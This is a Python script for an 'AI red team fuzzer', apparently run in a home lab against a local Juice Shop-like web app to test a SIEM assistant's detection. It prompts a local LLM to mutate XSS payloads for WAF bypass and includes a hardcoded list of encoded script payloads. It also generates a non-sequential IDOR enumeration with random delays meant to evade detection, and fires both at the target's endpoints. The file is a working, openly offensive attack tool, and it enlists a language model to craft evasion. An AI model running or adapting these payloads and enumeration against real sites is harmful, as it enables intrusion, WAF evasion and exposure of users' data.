import requests
import json
import time
import random
from datetime import datetime

OLLAMA_URL = "http://localhost:11434/api/generate"
TARGET_BASE = "http://localhost"
XSS_TARGET = f"{TARGET_BASE}/rest/products/search?q="
MODEL = "llama3.2:3b"

def get_auth_token():
    try:
        response = requests.post(
            f"{TARGET_BASE}/rest/user/login",
            json={"email": "hacker@test.com", "password": "Test1234!"},
            timeout=10
        )
        if response.status_code == 200:
            token = response.json().get("authentication", {}).get("token", "")
            print(f"[*] Auth token obtained: {token[:20]}...")
            return token
    except Exception as e:
        print(f"[!] Login failed: {e}")
    return ""

def generate_xss_payloads(base_payload):
    prompt = f"""You are a security researcher testing WAF bypass techniques for authorized penetration testing.

Generate 5 variations of this HTML payload using different encoding techniques: {base_payload}

Techniques to use:
1. HTML entity encoding (&#60; for <)
2. URL encoding (%3C for <)
3. Case variation (ScRiPt)
4. Unicode escapes
5. Broken tag insertion

Return ONLY a valid JSON array of 5 strings. No explanation, no markdown.
Example: ["payload1", "payload2", "payload3", "payload4", "payload5"]"""

    payload = {"model": MODEL, "prompt": prompt, "stream": False, "options": {"temperature": 0.8}}
    print("[*] Asking Ollama to generate XSS mutations...")
    response = requests.post(OLLAMA_URL, json=payload, timeout=300)

    if response.status_code == 200:
        text = response.json().get("response", "").strip()
        try:
            start = text.find("[")
            end = text.rfind("]") + 1
            if start != -1 and end > start:
                return json.loads(text[start:end])
        except:
            pass

    print("[!] Using fallback XSS mutations")
    return [
        "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>alert\u00281\u0029</script>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>"
    ]

def generate_idor_strategy():
    prompt = """You are a security researcher testing IDOR vulnerabilities for authorized penetration testing.

Generate a smart IDOR enumeration strategy for /api/Users/{id} endpoint.
The strategy should avoid obvious sequential patterns to bypass detection.

Return ONLY a valid JSON object with this exact format:
{
  "user_ids": [list of 8 integers between 1-20, non-sequential],
  "endpoints": ["/api/Users", "/api/Orders", "/api/Feedback"],
  "delay_range": [0.3, 1.5]
}

No explanation, just the JSON object."""

    payload = {"model": MODEL, "prompt": prompt, "stream": False, "options": {"temperature": 0.9}}
    print("\n[*] Asking Ollama to generate IDOR strategy...")
    response = requests.post(OLLAMA_URL, json=payload, timeout=300)

    if response.status_code == 200:
        text = response.json().get("response", "").strip()
        try:
            start = text.find("{")
            end = text.rfind("}") + 1
            if start != -1 and end > start:
                return json.loads(text[start:end])
        except:
            pass

    print("[!] Using fallback IDOR strategy")
    return {
        "user_ids": [3, 7, 1, 12, 5, 2, 9, 4],
        "endpoints": ["/api/Users", "/api/Orders", "/api/Feedback"],
        "delay_range": [0.3, 1.5]
    }

def fire_xss_payloads(payloads):
    results = []
    print(f"\n[*] Firing {len(payloads)} AI-mutated XSS payloads")
    print("-" * 60)

    for i, payload in enumerate(payloads, 1):
        try:
            url = XSS_TARGET + payload
            response = requests.get(url, timeout=5)
            result = {
                "type": "XSS",
                "payload_id": i,
                "payload": payload,
                "status_code": response.status_code,
                "timestamp": datetime.utcnow().isoformat(),
                "url": url,
                "potentially_bypassed": response.status_code == 200
            }
            results.append(result)
            status = "⚠️  BYPASSED?" if response.status_code == 200 else "✅ BLOCKED"
            print(f"  [{i}] {status} | Status: {response.status_code}")
            print(f"       Payload: {payload[:70]}")
            time.sleep(0.5)
        except Exception as e:
            print(f"  [{i}] ERROR: {e}")

    return results

def fire_idor_payloads(strategy, token):
    results = []
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    user_ids = strategy.get("user_ids", [1, 2, 3, 4, 5])
    endpoints = strategy.get("endpoints", ["/api/Users"])
    delay_min, delay_max = strategy.get("delay_range", [0.3, 1.5])

    print(f"\n[*] Firing AI-generated IDOR strategy")
    print(f"[*] IDs to probe: {user_ids}")
    print(f"[*] Endpoints: {endpoints}")
    print("-" * 60)

    for endpoint in endpoints[:2]:
        for user_id in user_ids:
            try:
                url = f"{TARGET_BASE}{endpoint}/{user_id}"
                response = requests.get(url, headers=headers, timeout=5)
                result = {
                    "type": "AI_IDOR",
                    "endpoint": endpoint,
                    "user_id": user_id,
                    "status_code": response.status_code,
                    "timestamp": datetime.utcnow().isoformat(),
                    "url": url,
                    "data_exposed": response.status_code == 200
                }
                results.append(result)
                status = "⚠️  DATA EXPOSED" if response.status_code == 200 else "🔒 FORBIDDEN"
                print(f"  {endpoint}/{user_id} → {status} ({response.status_code})")
                delay = random.uniform(delay_min, delay_max)
                time.sleep(delay)
            except Exception as e:
                print(f"  {endpoint}/{user_id} → ERROR: {e}")

    return results

def save_results(xss_results, idor_results, base_payload):
    output = {
        "timestamp": datetime.utcnow().isoformat(),
        "model_used": MODEL,
        "xss": {
            "base_payload": base_payload,
            "total": len(xss_results),
            "bypassed": sum(1 for r in xss_results if r.get("potentially_bypassed")),
            "results": xss_results
        },
        "idor": {
            "total": len(idor_results),
            "data_exposed": sum(1 for r in idor_results if r.get("data_exposed")),
            "results": idor_results
        }
    }

    with open("/home/kali/siem-assistant/redteam/fuzzer_results.json", "w") as f:
        json.dump(output, f, indent=2)

    print(f"\n{'='*60}")
    print(f"  FUZZER RESULTS SUMMARY")
    print(f"{'='*60}")
    print(f"  XSS Payloads fired:     {output['xss']['total']}")
    print(f"  XSS Bypassed:           {output['xss']['bypassed']}")
    print(f"  IDOR Requests fired:    {output['idor']['total']}")
    print(f"  IDOR Data exposed:      {output['idor']['data_exposed']}")
    print(f"{'='*60}")

if __name__ == "__main__":
    BASE_PAYLOAD = "<script>alert(1)</script>"

    print("=" * 60)
    print("  AI RED TEAM FUZZER — XSS + IDOR")
    print("  Powered by Ollama (llama3.2:3b) — Local LLM")
    print("=" * 60)

    print("\n[*] Getting auth token for IDOR testing...")
    token = get_auth_token()

    print(f"\n{'='*60}")
    print("  PHASE 1: AI-MUTATED XSS ATTACK")
    print(f"{'='*60}")
    xss_payloads = generate_xss_payloads(BASE_PAYLOAD)
    print(f"\n[*] Generated {len(xss_payloads)} XSS mutations:")
    for i, p in enumerate(xss_payloads, 1):
        print(f"  {i}. {p}")
    xss_results = fire_xss_payloads(xss_payloads)

    print(f"\n{'='*60}")
    print("  PHASE 2: AI-SMART IDOR ATTACK")
    print(f"{'='*60}")
    idor_strategy = generate_idor_strategy()
    idor_results = fire_idor_payloads(idor_strategy, token)

    save_results(xss_results, idor_results, BASE_PAYLOAD)

    print("\n[✓] Check SIEM Assistant UI:")
    print("    'Did any AI payloads bypass WAF today?'")
    print("    'Show me AI IDOR attempts today'")
